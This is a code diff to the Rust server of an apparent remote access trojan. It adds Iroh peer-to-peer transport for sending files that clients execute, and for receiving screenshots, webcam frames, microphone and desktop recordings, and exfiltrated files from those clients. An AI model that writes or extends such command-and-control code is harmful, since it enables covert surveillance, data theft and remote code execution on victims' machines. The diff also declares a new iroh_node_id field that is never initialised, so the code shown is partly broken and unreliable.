@@ -19,6 +19,7 @@ use common::RSA_BITS;
 use crate::utils::encryption::{handle_encryption_confirm, handle_encryption_request};
 use crate::utils::logger::Logger;
 use common::client_info::ClientInfo;
+use common::derp::RegionPing;
 
 pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
@@ -35,6 +36,8 @@ pub struct ServerWrapper {
     log_events: Logger,
     country_reader: maxminddb::Reader<Vec<u8>>,
     auto_upload_anonfiles: bool,
+    iroh_pings: Vec<RegionPing>,
+    iroh_node_id: String,
 }
 
 impl ServerWrapper {
@@ -65,7 +68,18 @@ impl ServerWrapper {
             log_events: Logger::new(),
             country_reader,
             auto_upload_anonfiles: false,
+            iroh_pings: Vec::new(),
         };
+
+        // Initialize Iroh for server
+        match crate::utils::iroh::init_iroh().await {
+            Ok((node_id, pings)) => {
+                s.iroh_pings = pings;
+                s.iroh_node_id = node_id;
+                println!("Server Iroh initialized");
+            }
+            Err(e) => println!("Failed to initialize Server Iroh: {}", e),
+        }
 
         s.channel_loop().await;
 
@@ -211,6 +225,32 @@ impl ServerWrapper {
 
                 RegisterClient(tx, addr, mut client_info) => {
                     self.txs.insert(addr, tx);
+
+                    // Coordinate Iroh if enabled
+                    if let Some(client_iroh) = &client_info.iroh {
+                        // Find best region (lowest overall ping)
+                        let mut best_region = 14; // Default to Amsterdam
+                        let mut lowest_sum = u128::MAX;
+
+                        for cp in &client_iroh.derp_pings {
+                            for sp in &self.iroh_pings {
+                                if cp.region_id == sp.region_id {
+                                    let sum = cp.ping + sp.ping;
+                                    if sum < lowest_sum {
+                                        lowest_sum = sum;
+                                        best_region = cp.region_id;
+                                    }
+                                }
+                            }
+                        }
+
+                        println!("Selected DERP region {} for client {}", best_region, addr);
+                        self.send_client_packet(&addr, ClientboundPacket::SetIrohConfig(IrohConfig {
+                            derp_region: best_region,
+                            server_node_id: self.iroh_node_id.clone(),
+                        })).await;
+                    }
+
                     client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
 
                     // Prefer the IP the client self-reported (fetched via my-ip.io).
@@ -542,6 +582,20 @@ impl ServerWrapper {
                                 ),
                             )
                             .await;
+
+                        if let Some(client_iroh) = &client.iroh {
+                            let file_data_clone = file_data.clone();
+                            let tx = self.txs.get(&addr).cloned();
+                            tokio::spawn(async move {
+                                if let Some(blob_info) = crate::utils::iroh::add_blob(file_data_clone.data.clone(), file_data_clone.name.clone(), BlobContext::FileUploadAndExecute).await {
+                                    if let Some(tx) = tx {
+                                        let _ = tx.send(ClientCommand::Write(ClientboundPacket::IrohDownloadBlob(blob_info))).await;
+                                    }
+                                }
+                            });
+                            return;
+                        }
+
                         self.send_client_packet(
                             &addr,
                             ClientboundPacket::UploadAndExecute(file_data),
@@ -577,6 +631,20 @@ impl ServerWrapper {
                                 ),
                             )
                             .await;
+
+                        if let Some(client_iroh) = &client.iroh {
+                            let file_data_clone = file_data.clone();
+                            let tx = self.txs.get(&addr).cloned();
+                            tokio::spawn(async move {
+                                if let Some(blob_info) = crate::utils::iroh::add_blob(file_data_clone.data.clone(), file_data_clone.name.clone(), BlobContext::FileUpload).await {
+                                    if let Some(tx) = tx {
+                                        let _ = tx.send(ClientCommand::Write(ClientboundPacket::IrohDownloadBlob(blob_info))).await;
+                                    }
+                                }
+                            });
+                            return;
+                        }
+
                         self.send_client_packet(
                             &addr,
                             ClientboundPacket::UploadFile(target_folder, file_data),
@@ -1304,6 +1372,81 @@ impl ServerWrapper {
                             format!("Auto upload to AnonFiles: {}", enabled),
                         )
                         .await;
+                }
+
+                IrohBlobReady(addr, blob_info) => {
+                    let addr = self.resolve_addr(&addr);
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        if let Some(client_iroh) = &client.iroh {
+                            let node_id = client_iroh.node_id.clone();
+                            let handle = self.tauri_handle.clone();
+                            let blob_info_clone = blob_info.clone();
+                            let addr_str = addr.to_string();
+
+                            tokio::spawn(async move {
+                                match crate::utils::iroh::download_blob(node_id, blob_info_clone.clone()).await {
+                                    Ok(data) => {
+                                        // Once downloaded, we route it to the appropriate handler as if it came via TCP
+                                        println!("Successfully downloaded iroh blob: {} ({})", blob_info_clone.name, blob_info_clone.hash);
+
+                                        // We need to re-inject this as a ServerCommand into the server loop
+                                        // or just handle it here by emitting to frontend.
+                                        // Emitting to frontend is easier for now.
+
+                                        match blob_info_clone.context {
+                                            BlobContext::Screenshot => {
+                                                if let Some(h) = &handle {
+                                                    h.lock().unwrap().emit("client_screenshot", serde_json::json!({
+                                                        "addr": addr_str,
+                                                        "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&data))
+                                                    })).ok();
+                                                }
+                                            }
+                                            BlobContext::Webcam => {
+                                                if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(data) {
+                                                    if let Some(h) = &handle {
+                                                        h.lock().unwrap().emit("webcam_result", serde_json::json!({
+                                                            "addr": addr_str,
+                                                            "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&jpeg_data)),
+                                                        })).ok();
+                                                    }
+                                                }
+                                            }
+                                            BlobContext::AudioRecording => {
+                                                if let Some(h) = &handle {
+                                                    h.lock().unwrap().emit("mic_recording_file", serde_json::json!({
+                                                        "addr": addr_str,
+                                                        "name": blob_info_clone.name,
+                                                        "data": general_purpose::STANDARD.encode(&data),
+                                                    })).ok();
+                                                }
+                                            }
+                                            BlobContext::DesktopRecording => {
+                                                if let Some(h) = &handle {
+                                                    h.lock().unwrap().emit("desktop_recording_file", serde_json::json!({
+                                                        "addr": addr_str,
+                                                        "name": blob_info_clone.name,
+                                                        "data": general_purpose::STANDARD.encode(&data),
+                                                    })).ok();
+                                                }
+                                            }
+                                            BlobContext::FileDownload => {
+                                                if let Some(h) = &handle {
+                                                    h.lock().unwrap().emit("download_file_result", serde_json::json!({
+                                                        "addr": addr_str,
+                                                        "name": blob_info_clone.name,
+                                                        "data": general_purpose::STANDARD.encode(&data),
+                                                    })).ok();
+                                                }
+                                            }
+                                            _ => {}
+                                        }
+                                    }
+                                    Err(e) => println!("Failed to download iroh blob: {}", e),
+                                }
+                            });
+                        }
+                    }
                 }
             }
         }
